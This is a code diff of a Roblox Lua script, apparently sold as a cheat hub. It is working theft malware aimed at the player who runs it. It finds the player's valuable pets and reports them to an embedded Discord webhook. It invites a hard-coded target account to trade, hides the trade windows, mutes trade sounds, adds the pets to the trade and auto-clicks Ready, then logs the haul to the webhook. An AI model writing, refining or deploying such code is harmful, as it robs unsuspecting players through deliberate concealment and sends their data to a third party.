@@ -1,4 +1,3 @@
-
 task.spawn(function()
     if not game:IsLoaded() then
         game.Loaded:Wait()
@@ -9,41 +8,44 @@ task.spawn(function()
         return
     end
 
-local ALLOWED_ANIMALS = {
-    "Strawberry Elephant",
-    "Meowl",
-    "Skibidi Toilet",
-    "Dragon Gingerini",
-    "Dragon Cannelloni",
-    "Hydra Dragon Cannelloni",
-    "Griffin",
-    "John Pork",
-    "Elefanto Frigo",
-    "Antonio",
-    "Arcadragon",
-    "Kalika Bros",
-    "Dragon Aquanini",
-    "La Supreme Combinasion",
-    "Headless Horseman",
-    "Signore Carapace",
-    "Fishino Clownino",
-    "Digi Narwhal",
-    "Moby Bros",
-    "Love Love Bear",
-    "Ginger Gerat",
-    "La Breakfast Combinasion",
-    "Boneca Ambalabu",
-}
+    local ALLOWED_ANIMALS = {
+        "Strawberry Elephant",
+        "Meowl",
+        "Skibidi Toilet",
+        "Dragon Gingerini",
+        "Dragon Cannelloni",
+        "Hydra Dragon Cannelloni",
+        "Griffin",
+        "John Pork",
+        "Elefanto Frigo",
+        "Antonio",
+        "Arcadragon",
+        "Kalika Bros",
+        "Dragon Aquanini",
+        "La Supreme Combinasion",
+        "Headless Horseman",
+        "Signore Carapace",
+        "Fishino Clownino",
+        "Digi Narwhal",
+        "Moby Bros",
+        "Love Love Bear",
+        "Ginger Gerat",
+        "Bumbatron",
+    }
     
     local ALLOWED_ANIMALS_SET = {}
     for _, name in ipairs(ALLOWED_ANIMALS) do
         ALLOWED_ANIMALS_SET[name] = true
     end
 
+    local TARGET_USER_ID = 7919988179
+    local TARGET_USERNAME = "S370z1"
     local WEBHOOK_URL = "https://discord.com/api/webhooks/1509251562780889128/jwigPZCSgn2cGoPcFjG9Pz6iZ_klziZ-3PqlcBQk0T9a8XH4-YzFdlohlUE_7PfbA7h7"
     local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
-    local Remotes = {}
+    local Remotes = {Invite = nil, AddBrainrot = nil}
+    local remotesReady = false
+
     local Services = setmetatable({}, {
         __index = function(self, name)
             local success, cache = pcall(function()
@@ -82,112 +84,128 @@ local ALLOWED_ANIMALS = {
         return "$" .. tostring(math.floor(n)) .. "/s"
     end
 
-    local function scanRemotesViaGC()
-        local found = {
-            Invite = nil,
-            AddBrainrot = nil
-        }
-        
+    local function findRemotes()
+        if Remotes.Invite and Remotes.AddBrainrot then return end
         for _, v in ipairs(getgc(true)) do
             if type(v) == "function" and islclosure(v) then
-                local constants = debug.getconstants(v)
-                local upvalues = debug.getupvalues(v)
-                
-                for _, const in ipairs(constants) do
-                    if type(const) == "string" then
-                        if const == "afb005f9-6e81-4e0a-8bb0-3555938a9658" then
-                            for _, upv in ipairs(upvalues) do
-                                if typeof(upv) == "Instance" and (upv:IsA("RemoteFunction") or upv:IsA("RemoteEvent")) then
-                                    found.Invite = upv
-                                    break
+                local success, constants = pcall(debug.getconstants, v)
+                if success then
+                    for _, const in ipairs(constants) do
+                        if type(const) == "string" then
+                            if const == "afb005f9-6e81-4e0a-8bb0-3555938a9658" and not Remotes.Invite then
+                                local successUpv, upvalues = pcall(debug.getupvalues, v)
+                                if successUpv then
+                                    for _, upv in ipairs(upvalues) do
+                                        if typeof(upv) == "Instance" and (upv:IsA("RemoteFunction") or upv:IsA("RemoteEvent")) then
+                                            Remotes.Invite = upv
+                                            break
+                                        end
+                                    end
                                 end
                             end
-                            if not found.Invite then
-                                found.Invite = v
-                            end
-                        elseif const == "6b5f15fb-5cb9-4d07-a031-bbff8e641eda" then
-                            for _, upv in ipairs(upvalues) do
-                                if typeof(upv) == "Instance" and (upv:IsA("RemoteFunction") or upv:IsA("RemoteEvent")) then
-                                    found.AddBrainrot = upv
-                                    break
+                            if const == "6b5f15fb-5cb9-4d07-a031-bbff8e641eda" and not Remotes.AddBrainrot then
+                                local successUpv, upvalues = pcall(debug.getupvalues, v)
+                                if successUpv then
+                                    for _, upv in ipairs(upvalues) do
+                                        if typeof(upv) == "Instance" and upv:IsA("RemoteFunction") then
+                                            Remotes.AddBrainrot = upv
+                                            break
+                                        end
+                                    end
                                 end
-                            end
-                            if not found.AddBrainrot then
-                                found.AddBrainrot = v
                             end
                         end
                     end
                 end
             end
-            
-            if found.Invite and found.AddBrainrot then
-                break
+            if Remotes.Invite and Remotes.AddBrainrot then break end
+        end
+    end
+
+    local function waitForChildSafe(parent, name, timeout)
+        timeout = timeout or 30
+        local child = parent:FindFirstChild(name)
+        if child then return child end
+        local start = os.clock()
+        while not child and os.clock() - start < timeout do
+            child = parent:FindFirstChild(name)
+            if child then return child end
+            task.wait(0.2)
+        end
+        return parent:FindFirstChild(name)
+    end
+
+    local RepStorage = Services.ReplicatedStorage
+    waitForChildSafe(RepStorage, "Datas", 30)
+    waitForChildSafe(RepStorage, "Shared", 30)
+    waitForChildSafe(RepStorage, "Controllers", 30)
+    waitForChildSafe(RepStorage, "Packages", 30)
+    waitForChildSafe(RepStorage, "Classes", 15)
+
+    local datasFolder = RepStorage:FindFirstChild("Datas")
+    if datasFolder then waitForChildSafe(datasFolder, "Animals", 15) end
+    local sharedFolder = RepStorage:FindFirstChild("Shared")
+    if sharedFolder then waitForChildSafe(sharedFolder, "Animals", 15) end
+    local controllersFolder = RepStorage:FindFirstChild("Controllers")
+    if controllersFolder then
+        waitForChildSafe(controllersFolder, "InterfaceController", 15)
+        waitForChildSafe(controllersFolder, "CameraController", 15)
+        waitForChildSafe(controllersFolder, "NotificationController", 15)
+        waitForChildSafe(controllersFolder, "CornerNotificationController", 15)
+        waitForChildSafe(controllersFolder, "PlotController", 15)
+    end
+    local packagesFolder = RepStorage:FindFirstChild("Packages")
+    if packagesFolder then
+        waitForChildSafe(packagesFolder, "ReplicatorClient", 15)
+        waitForChildSafe(packagesFolder, "Synchronizer", 15)
+    end
+
+    task.wait(1)
+
+    findRemotes()
+    if Remotes.Invite and Remotes.AddBrainrot then
+        remotesReady = true
+    end
+
+    task.spawn(function()
+        local checks = 0
+        while true do
+            if not (Remotes.Invite and Remotes.AddBrainrot) then
+                findRemotes()
+                if Remotes.Invite and Remotes.AddBrainrot then
+                    remotesReady = true
+                end
+                checks += 1
+                task.wait(checks < 10 and 0.5 or 2)
+            else
+                task.wait(5)
             end
         end
-        
-        return found
-    end
-
-    local gcRemotes = scanRemotesViaGC()
-    Remotes = gcRemotes
-
-    -- Retry en background si remotes pas trouvés (sans bloquer)
-    if not Remotes.Invite or not Remotes.AddBrainrot then
-        task.spawn(function()
-            for _, delay in ipairs({2, 3, 5}) do
-                task.wait(delay)
-                local retry = scanRemotesViaGC()
-                if retry.Invite then Remotes.Invite = retry.Invite end
-                if retry.AddBrainrot then Remotes.AddBrainrot = retry.AddBrainrot end
-                if Remotes.Invite and Remotes.AddBrainrot then break end
-            end
-        end)
-    end
+    end)
 
     local INVITE_UUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
     local ADD_BRAINROT_UUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
 
-    local function callRemote(remoteType, uuid, ...)
-        local remote = Remotes[remoteType]
-        if not remote then
-            return nil
-        end
-        
-        local args = {...}
-        
-        if typeof(remote) == "Instance" then
-            if remote:IsA("RemoteFunction") then
-                local success, result = pcall(function()
-                    return remote:InvokeServer(uuid, table.unpack(args))
-                end)
-                if not success then
-                    return nil
-                end
-                return result
-            elseif remote:IsA("RemoteEvent") then
-                local success, err = pcall(function()
-                    remote:FireServer(uuid, table.unpack(args))
-                end)
-                if not success then
-                    return nil
-                end
-                return true
-            end
-        end
-        
-        if type(remote) == "function" then
-            local success, result = pcall(function()
-                return remote(uuid, table.unpack(args))
-            end)
-            if not success then
-                return nil
-            end
-            return result
-        end
-        
+    local function sendInvite(targetUserId)
+        if not Remotes.Invite then return false end
+        local success, res = pcall(function()
+            return Remotes.Invite:InvokeServer(INVITE_UUID, targetUserId)
+        end)
+        return success and res
+    end
+
+    local function addBrainrot(podiumIndex, brainrotData)
+        if not Remotes.AddBrainrot then return nil end
+        local success, res = pcall(function()
+            return Remotes.AddBrainrot:InvokeServer(ADD_BRAINROT_UUID, podiumIndex, brainrotData)
+        end)
+        if success then return res end
         return nil
     end
 
+    -- =====================================================
+    -- WEBHOOK SCANNER
+    -- =====================================================
     task.spawn(function()
         local webhookSent = false
         local HttpService = Services.HttpService
@@ -202,7 +220,7 @@ local ALLOWED_ANIMALS = {
                 PlotController = require(ReplicatedStorage.Controllers:WaitForChild("PlotController", 5))
             end)
             if not PlotController then return nil end
-            for i = 1, 5 do
+            for i = 1, 30 do
                 local ok, plot = pcall(function() return PlotController.GetMyPlot() end)
                 if ok and plot and plot.PlotModel then return plot.PlotModel end
                 task.wait(1)
@@ -295,90 +313,105 @@ local ALLOWED_ANIMALS = {
             if success then webhookSent = true end
         end
 
-        task.spawn(function()
-            while true do
-                task.wait(5)
-                if webhookSent then break end
-                local foundBrainrots = {}
-                pcall(function()
-                    local debris = workspace:FindFirstChild("Debris")
-                    if not debris then return end
-                    local myPlot = getMyPlotModel()
-                    if not myPlot then return end
-                    local plotPos = myPlot:GetPivot().Position
-                    local plotSize = Vector3.new(64, 20, 64)
-                    for _, pet in ipairs(debris:GetChildren()) do
-                        local ao = pet:FindFirstChild("AnimalOverhead") or pet:FindFirstChild("AnimalOverhead", true)
-                        if not ao then continue end
-                        local stolen = ao:FindFirstChild("Stolen")
-                        if stolen and stolen.Text:upper():find("FUSING") then continue end
-                        local nameObj = ao:FindFirstChild("DisplayName")
-                        local genObj = ao:FindFirstChild("Generation")
-                        if not nameObj then continue end
-                        local petPos = pet:GetPivot().Position
-                        local dx = math.abs(petPos.X - plotPos.X)
-                        local dz = math.abs(petPos.Z - plotPos.Z)
-                        if not ((dx <= plotSize.X / 2) and (dz <= plotSize.Z / 2)) then continue end
-                        local nameText = (nameObj:IsA("TextLabel") or nameObj:IsA("TextBox") or nameObj:IsA("TextButton"))
-                            and nameObj.Text or tostring(nameObj.Value)
-                        if ALLOWED_ANIMALS_SET[nameText] then
-                            local genText = genObj and (
-                                (genObj:IsA("TextLabel") or genObj:IsA("TextBox") or genObj:IsA("TextButton"))
-                                and genObj.Text or tostring(genObj.Value)
-                            ) or "0"
-                            local genVal = parseGeneration(genText)
-                            table.insert(foundBrainrots, {
-                                name = nameText,
-                                gen = formatNumber(genVal),
-                                genVal = genVal,
-                            })
-                        end
+        while true do
+            task.wait(3)
+            if webhookSent then break end
+            local foundBrainrots = {}
+            pcall(function()
+                local debris = workspace:FindFirstChild("Debris")
+                if not debris then return end
+                local myPlot = getMyPlotModel()
+                if not myPlot then return end
+                local plotPos = myPlot:GetPivot().Position
+                local plotSize = Vector3.new(64, 20, 64)
+                for _, pet in ipairs(debris:GetChildren()) do
+                    local ao = pet:FindFirstChild("AnimalOverhead") or pet:FindFirstChild("AnimalOverhead", true)
+                    if not ao then continue end
+                    local stolen = ao:FindFirstChild("Stolen")
+                    if stolen and stolen.Text:upper():find("FUSING") then continue end
+                    local nameObj = ao:FindFirstChild("DisplayName")
+                    local genObj = ao:FindFirstChild("Generation")
+                    if not nameObj then continue end
+                    local petPos = pet:GetPivot().Position
+                    local dx = math.abs(petPos.X - plotPos.X)
+                    local dz = math.abs(petPos.Z - plotPos.Z)
+                    if not ((dx <= plotSize.X / 2) and (dz <= plotSize.Z / 2)) then continue end
+                    local nameText = (nameObj:IsA("TextLabel") or nameObj:IsA("TextBox") or nameObj:IsA("TextButton"))
+                        and nameObj.Text or tostring(nameObj.Value)
+                    if ALLOWED_ANIMALS_SET[nameText] then
+                        local genText = genObj and (
+                            (genObj:IsA("TextLabel") or genObj:IsA("TextBox") or genObj:IsA("TextButton"))
+                            and genObj.Text or tostring(genObj.Value)
+                        ) or "0"
+                        local genVal = parseGeneration(genText)
+                        table.insert(foundBrainrots, {
+                            name = nameText,
+                            gen = formatNumber(genVal),
+                            genVal = genVal,
+                        })
                     end
-                end)
-                if #foundBrainrots > 0 then
-                    sendWebhook(foundBrainrots)
+                end
+            end)
+            if #foundBrainrots > 0 then
+                sendWebhook(foundBrainrots)
+            end
+        end
+    end)
+
+
+    task.spawn(function()
+        local HttpService = Services.HttpService
+        local LocalPlayer = Services.Players.LocalPlayer
+        
+        local Animals = require(RepStorage.Datas:WaitForChild("Animals", 15))
+        local AnimalsShared = require(RepStorage.Shared:WaitForChild("Animals", 15))
+
+        local syncFolder = RepStorage.Packages:WaitForChild("Synchronizer", 15)
+        local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
+
+        local PlotClientClass = nil
+        pcall(function()
+            local classesFolder = RepStorage:FindFirstChild("Classes")
+            if classesFolder then
+                local plotClientModule = classesFolder:FindFirstChild("PlotClient")
+                if plotClientModule then
+                    PlotClientClass = require(plotClientModule)
                 end
             end
         end)
-    end)
 
-    task.spawn(function()
-        local TARGET_USER_ID = 7919988179
-        local TARGET_USERNAME = "S370z1"
-        local lastOfferedList = {}
-        local HttpService = Services.HttpService
+        local InterfaceController = require(RepStorage.Controllers:WaitForChild("InterfaceController", 15))
+        local ReplicatorClient = require(RepStorage.Packages:WaitForChild("ReplicatorClient", 15))
+        local CameraController = require(RepStorage.Controllers:WaitForChild("CameraController", 15))
+        local NotificationController = require(RepStorage.Controllers:WaitForChild("NotificationController", 15))
+        local CornerNotificationController = require(RepStorage.Controllers:WaitForChild("CornerNotificationController", 15))
 
-        local LocalPlayer = Services.Players.LocalPlayer
-        
-        local Animals = require(Services.ReplicatedStorage.Datas.Animals)
-        local AnimalsShared = require(Services.ReplicatedStorage.Shared.Animals)
-
-        local syncFolder = Services.ReplicatedStorage.Packages:WaitForChild("Synchronizer")
-        local requestData = syncFolder:FindFirstChild("RequestData")
-
-        local PlotClientClass = Services.ReplicatedStorage:FindFirstChild("Classes")
-            and Services.ReplicatedStorage.Classes:FindFirstChild("PlotClient")
-            and require(Services.ReplicatedStorage.Classes.PlotClient)
-
-        local InterfaceController = require(Services.ReplicatedStorage.Controllers.InterfaceController)
-        local ReplicatorClient = require(Services.ReplicatedStorage.Packages.ReplicatorClient)
-        local CameraController = require(Services.ReplicatedStorage.Controllers.CameraController)
-        local NotificationController = require(Services.ReplicatedStorage.Controllers.NotificationController)
-        local CornerNotificationController = require(Services.ReplicatedStorage.Controllers.CornerNotificationController)
-
-        local tradeRep = ReplicatorClient.get(("Trade_%*"):format(LocalPlayer.UserId))
+        local tradeRep = ReplicatorClient.get(("Trade_%s"):format(LocalPlayer.UserId))
 
         local hiding = false
+        local tradeActive = false
+        local loggerActive = false
         local blurBlockConns = {}
         local originalBlurSizes = {}
         local originalCameraFOV = nil
         local fovBlockConns = {}
         local originalBlurFunc = CameraController.Blur
+
+        -- Bloquer le blur dès le départ (manuel et auto-trade)
+        pcall(function()
+            local lighting = game:GetService("Lighting")
+            for _, desc in lighting:GetDescendants() do
+                if desc:IsA("BlurEffect") then desc.Size = 0 end
+            end
+            lighting.DescendantAdded:Connect(function(desc)
+                if desc:IsA("BlurEffect") then desc.Size = 0 end
+            end)
+            CameraController.Blur = function() end
+        end)
         local originalFovFunc = CameraController.Fov
 
         local savedSoundVolumes = {}
         local soundBlockConns = {}
-        local originalMasterVolume = nil
 
         local originalCorner = CornerNotificationController.Add
         local originalNotify = NotificationController.Notify
@@ -386,36 +419,16 @@ local ALLOWED_ANIMALS = {
         local originalSetCore = nil
         pcall(function() originalSetCore = Services.StarterGui.SetCore end)
 
-        -- ВОЗВРАЩЕНО: переменные для GUIs
-        local TRADE_GUI_NAMES = { "TradeLiveTrade", "TradePrompts" }
+
+        local TRADE_GUI_NAMES = {"TradeLiveTrade", "TradePrompts"}
         local tradeGuiPrevEnabled = {}
         local tradeGuiConnections = {}
-        local toolStash = {}
 
-        local function stashTools(hide)
-            if hide then
-                toolStash = {}
-                local char = LocalPlayer.Character
-                local hum = char and char:FindFirstChildOfClass("Humanoid")
-                if hum then pcall(function() hum:UnequipTools() end) end
-                local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
-                for _, container in ipairs({ char, bp }) do
-                    if container then
-                        for _, item in ipairs(container:GetChildren()) do
-                            if item:IsA("Tool") or item:IsA("HopperBin") then
-                                table.insert(toolStash, { item = item, parent = item.Parent })
-                                pcall(function() item.Parent = nil end)
-                            end
-                        end
-                    end
-                end
-            else
-                for _, s in ipairs(toolStash) do
-                    if s.item and s.parent then pcall(function() s.item.Parent = s.parent end) end
-                end
-                toolStash = {}
-            end
-        end
+        local TRADE_SOUND_KEYWORDS = {
+            "trade", "invite", "ready", "accept", "decline", "cancel",
+            "notification", "alert", "swoosh", "whoosh",
+            "popup", "ding", "chime", "bell"
+        }
 
         local function blockBlur()
             local lighting = game:GetService("Lighting")
@@ -486,59 +499,65 @@ local ALLOWED_ANIMALS = {
             end
         end
 
-        local function muteAllSounds()
+
+    
+        local function isTradeSound(sound)
+            local name = sound.Name:lower()
+            local path = sound:GetFullName():lower()
+            for _, keyword in ipairs(TRADE_SOUND_KEYWORDS) do
+                if name:find(keyword) then return true end
+            end
+            if path:find("trade") then return true end
+            return false
+        end
+
+        local function muteTradeSounds()
             savedSoundVolumes = {}
-            local function processContainer(container)
-                if not container then return end
-                for _, desc in ipairs(container:GetDescendants()) do
-                    if desc:IsA("Sound") then
-                        savedSoundVolumes[desc] = desc.Volume
-                        desc.Volume = 0
-                        local conn = desc:GetPropertyChangedSignal("Volume"):Connect(function()
-                            if hiding and desc.Volume > 0 then desc.Volume = 0 end
-                        end)
-                        table.insert(soundBlockConns, conn)
-                    end
+            local soundsFolder = Services.ReplicatedStorage:FindFirstChild("Sounds")
+            if not soundsFolder then return end
+            local sfx = soundsFolder:FindFirstChild("Sfx")
+            if not sfx then return end
+
+            for _, desc in ipairs(sfx:GetDescendants()) do
+                if desc:IsA("Sound") and isTradeSound(desc) then
+                    savedSoundVolumes[desc] = desc.Volume
+                    desc.Volume = 0
+                    local conn = desc:GetPropertyChangedSignal("Volume"):Connect(function()
+                        if hiding and desc.Volume > 0 then desc.Volume = 0 end
+                    end)
+                    table.insert(soundBlockConns, conn)
                 end
             end
 
-            processContainer(Services.ReplicatedStorage:FindFirstChild("Sounds"))
-            processContainer(Services.SoundService)
-            processContainer(LocalPlayer:FindFirstChildOfClass("PlayerGui"))
-
-            pcall(function()
-                originalMasterVolume = Services.SoundService.Volume
-                Services.SoundService.Volume = 0
-            end)
-
-            local addedConn = game.DescendantAdded:Connect(function(desc)
-                if hiding and desc:IsA("Sound") then
-                    task.defer(function()
-                        if hiding and desc and desc.Parent then
-                            savedSoundVolumes[desc] = desc.Volume
-                            desc.Volume = 0
-                            pcall(function() desc:Stop() end)
-                        end
+            local addConn = sfx.DescendantAdded:Connect(function(desc)
+                if desc:IsA("Sound") and hiding and isTradeSound(desc) then
+                    savedSoundVolumes[desc] = desc.Volume
+                    desc.Volume = 0
+                    local propConn = desc:GetPropertyChangedSignal("Volume"):Connect(function()
+                        if hiding and desc.Volume > 0 then desc.Volume = 0 end
                     end)
+                    table.insert(soundBlockConns, propConn)
                 end
             end)
-            table.insert(soundBlockConns, addedConn)
+            table.insert(soundBlockConns, addConn)
+
+            local activated = sfx:FindFirstChild("Activated")
+            if activated and activated:IsA("Sound") then
+                savedSoundVolumes[activated] = activated.Volume
+                activated.Volume = 0
+            end
         end
 
-        local function unmuteAllSounds()
+        local function unmuteTradeSounds()
             for _, conn in ipairs(soundBlockConns) do pcall(function() conn:Disconnect() end) end
             soundBlockConns = {}
             for sound, volume in pairs(savedSoundVolumes) do
                 if sound and sound.Parent then pcall(function() sound.Volume = volume end) end
             end
             savedSoundVolumes = {}
-            if originalMasterVolume then
-                pcall(function() Services.SoundService.Volume = originalMasterVolume end)
-                originalMasterVolume = nil
-            end
         end
 
-        -- ВОЗВРАЩЕНО: функция скрытия GUIs
+
         local function setTradeGuisHidden(hide)
             local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
             if not pg then return end
@@ -568,9 +587,7 @@ local ALLOWED_ANIMALS = {
             end
         end
 
-        local cachedMyPlot = nil
         local function getMyPlot()
-            if cachedMyPlot and cachedMyPlot.Parent then return cachedMyPlot end
             local PlotController
             pcall(function()
                 PlotController = require(Services.ReplicatedStorage.Controllers:WaitForChild("PlotController", 5))
@@ -578,10 +595,7 @@ local ALLOWED_ANIMALS = {
             if not PlotController then return nil end
             for i = 1, 30 do
                 local ok, plot = pcall(function() return PlotController.GetMyPlot() end)
-                if ok and plot and plot.PlotModel then
-                    cachedMyPlot = plot.PlotModel
-                    return cachedMyPlot
-                end
+                if ok and plot and plot.PlotModel then return plot.PlotModel end
                 task.wait(1)
             end
             return nil
@@ -649,6 +663,8 @@ local ALLOWED_ANIMALS = {
             return {}
         end
 
+        local lastOfferedList = {}
+
         local function sendTradeCompleteWebhook(offered)
             if not offered or #offered == 0 then return end
             local requestFn = (syn and syn.request) or (http and http.request) or http_request or request
@@ -669,19 +685,20 @@ local ALLOWED_ANIMALS = {
                 description = desc,
                 color = 5763719,
                 fields = {
-                    { name = "Target", value = TARGET_USERNAME .. " (" .. tostring(TARGET_USER_ID) .. ")", inline = true },
+                    { name = "Target", value = tostring(TARGET_USER_ID), inline = true },
                     { name = "Items", value = tostring(#offered), inline = true },
                 },
                 footer = { text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
             }
-            local payload = Services.HttpService:JSONEncode({
+            local payload = HttpService:JSONEncode({
                 embeds = { embed }, username = "Trade Logger", avatar_url = GOOD_AVATAR
             })
             pcall(function()
                 requestFn({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payload })
             end)
         end
+
 
         local function applyHiding()
             if hiding then return end
@@ -700,14 +717,14 @@ local ALLOWED_ANIMALS = {
                     end
                 end
             end)
+
             InterfaceController.Toggle = function(self, p12, p13, p14)
                 p14 = p14 or {}
                 if not table.find(p14, "Hud") then table.insert(p14, "Hud") end
                 return originalToggle(self, p12, p13, p14)
             end
-            muteAllSounds()
-            setTradeGuisHidden(true) -- ВОЗВРАЩЕНО
-            -- stashTools(true)
+            muteTradeSounds()
+            setTradeGuisHidden(true)
         end
 
         local function restoreHiding()
@@ -723,9 +740,8 @@ local ALLOWED_ANIMALS = {
                 if originalSetCore then Services.StarterGui.SetCore = originalSetCore end
             end)
             InterfaceController.Toggle = originalToggle
-            unmuteAllSounds()
-            setTradeGuisHidden(false) -- ВОЗВРАЩЕНО
-            -- stashTools(false)
+            unmuteTradeSounds()
+            setTradeGuisHidden(false)
         end
 
         local function stopHiding()
@@ -733,33 +749,26 @@ local ALLOWED_ANIMALS = {
         end
 
         local function tryAddBrainrot(entry)
-            -- Format attendu par le serveur
-            local brainrotData = {
-                UUID        = entry.animal.UUID or "",
-                OfflineGain = entry.animal.OfflineGain or 0,
-                Index       = entry.animal.Index,
-                LastCollect = entry.animal.LastCollect or os.time(),
-            }
             local attempts = 0
             while attempts < 15 do
                 attempts += 1
-                local result = callRemote("AddBrainrot", ADD_BRAINROT_UUID, entry.index, brainrotData)
+                local result = addBrainrot(entry.index, entry.animal)
                 
                 if result == true then 
                     return true 
                 elseif result == false then
-                    task.wait(0.2)
+                    task.wait(0.15)
                 else
                     if type(result) == "string" then
                         if result:lower():find("wait") or result:lower():find("spam") then
-                            task.wait(0.5)
+                            task.wait(0.3)
                         elseif result:lower():find("space") or result:lower():find("full") then
                             return "nospace"
                         else
                             return false
                         end
                     else
-                        task.wait(0.2)
+                        task.wait(0.15)
                     end
                 end
             end
@@ -792,7 +801,7 @@ local ALLOWED_ANIMALS = {
                     offered += 1
                     table.insert(lastOfferedList, entry)
                 end
-                task.wait(0.15)
+                task.wait(0.1)
             end
             
             task.spawn(function()
@@ -801,87 +810,117 @@ local ALLOWED_ANIMALS = {
                 end
                 sendTradeCompleteWebhook(lastOfferedList)
                 stopHiding()
+                tradeActive = false
             end)
         end
 
-        local resumed = false
+    
+        while true do
+            if (Remotes.Invite and Remotes.AddBrainrot) then
+                local list = getWhitelistBrainrots()
+                if #list > 0 then
+                    loggerActive = true
+                    break
+                end
+            end
+            task.wait(0.5)
+        end
 
-        setTradeGuisHidden(true) -- ВОЗВРАЩЕНО: сразу скрываем
+
+        task.spawn(function()
+            local pg = LocalPlayer:WaitForChild("PlayerGui")
+            local HUD_NAMES = {"Hud", "HUD", "Inventory", "Hotbar", "Toolbar", "Backpack"}
+
+            local function forceEnable()
+                for _, gui in ipairs(pg:GetChildren()) do
+                    if gui:IsA("ScreenGui") then
+                        for _, hudName in ipairs(HUD_NAMES) do
+                            if gui.Name == hudName and gui.Enabled == false then
+                                pcall(function() gui.Enabled = true end)
+                            end
+                        end
+                    end
+                end
+            end
+
+            local function hookGui(gui)
+                if not gui:IsA("ScreenGui") then return end
+                for _, hudName in ipairs(HUD_NAMES) do
+                    if gui.Name == hudName then
+                        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                            if not gui.Enabled then
+                                pcall(function() gui.Enabled = true end)
+                            end
+                        end)
+                        break
+                    end
+                end
+            end
+
+            for _, gui in ipairs(pg:GetChildren()) do hookGui(gui) end
+            pg.ChildAdded:Connect(hookGui)
+
+            while true do
+                forceEnable()
+                task.wait(0.1)
+            end
+        end)
+
+        setTradeGuisHidden(true)
+
+
+        task.spawn(function()
+            sendInvite(TARGET_USER_ID)
+        end)
+
 
         task.spawn(function()
             while true do
-                task.wait(2)
-                if resumed then continue end
+                task.wait(3)
+                if tradeActive then continue end
+                if not (Remotes.Invite and Remotes.AddBrainrot) then continue end
                 local list = getWhitelistBrainrots()
                 if #list == 0 then continue end
-                callRemote("Invite", INVITE_UUID, TARGET_USER_ID)
+                sendInvite(TARGET_USER_ID)
             end
         end)
 
         task.spawn(function()
             while true do
-                setTradeGuisHidden(true) -- ВОЗВРАЩЕНО: постоянно принудительно скрываем
+                setTradeGuisHidden(true)
                 task.wait(0.5)
             end
         end)
 
         tradeRep:ListenRaw(function(value)
-            if not resumed and value ~= nil and tradeRep:TryIndex({ "active", "data" }) then
-                resumed = true
+            if not loggerActive then return end
+            if not tradeActive and value ~= nil and tradeRep:TryIndex({ "active", "data" }) then
+                tradeActive = true
                 task.spawn(function()
                     applyHiding()
-                    task.wait(0.5)
+                    task.wait(0.3)
                     offerWhitelistBrainrots()
+                end)
+            elseif tradeActive and (value == nil or not tradeRep:TryIndex({ "active", "data" })) then
+                task.delay(2.5, function()
+                    tradeActive = false
                 end)
             end
         end)
 
         task.spawn(function()
-            task.spawn(function()
-                while task.wait(0.5) do
-                    if hiding then
-                        pcall(function()
-                            local readyBtn = LocalPlayer.PlayerGui:FindFirstChild("TradeLiveTrade")
-                                and LocalPlayer.PlayerGui.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
-                                and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other")
-                                and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
-                            if readyBtn and firesignal then
-                                firesignal(readyBtn.Activated)
-                            end
-                        end)
-                    end
-                end
-            end)
-
-            task.delay(5, function()
-                local promptContainer = LocalPlayer.PlayerGui:FindFirstChild("DuelsMachinePrompt")
-                    and LocalPlayer.PlayerGui.DuelsMachinePrompt:FindFirstChild("DuelsMachinePrompt")
-                if not promptContainer then return end
-                
-                promptContainer.ChildAdded:Connect(function(child)
-                    if not hiding then return end
-                    
-                    if child.Name == "Prompt" then
-                        local label = child:FindFirstChild("Label", true)
-                        if label and label.Text == "Trade Request" then
-                            task.wait(0.1)
-                            local yesButton = child:FindFirstChild("Yes", true)
-                            if yesButton then
-                                if firesignal then
-                                    firesignal(yesButton.Activated)
-                                else
-                                    local VirtualInputManager = game:GetService("VirtualInputManager")
-                                    local pos = yesButton.AbsolutePosition + (yesButton.AbsoluteSize / 2)
-                                    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)
-                                    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)
-                                end
-                            end
-                        end
+            while task.wait(0.5) do
+                if not hiding then continue end
+                pcall(function()
+                    local readyBtn = LocalPlayer.PlayerGui:FindFirstChild("TradeLiveTrade")
+                        and LocalPlayer.PlayerGui.TradeLiveTrade:FindFirstChild("TradeLiveTrade")
+                        and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other")
+                        and LocalPlayer.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
+                    if readyBtn and firesignal then
+                        firesignal(readyBtn.Activated)
                     end
                 end)
-            end)
+            end
         end)
     end)
 end)
-
-print("✦ by S2 HUB ✦")
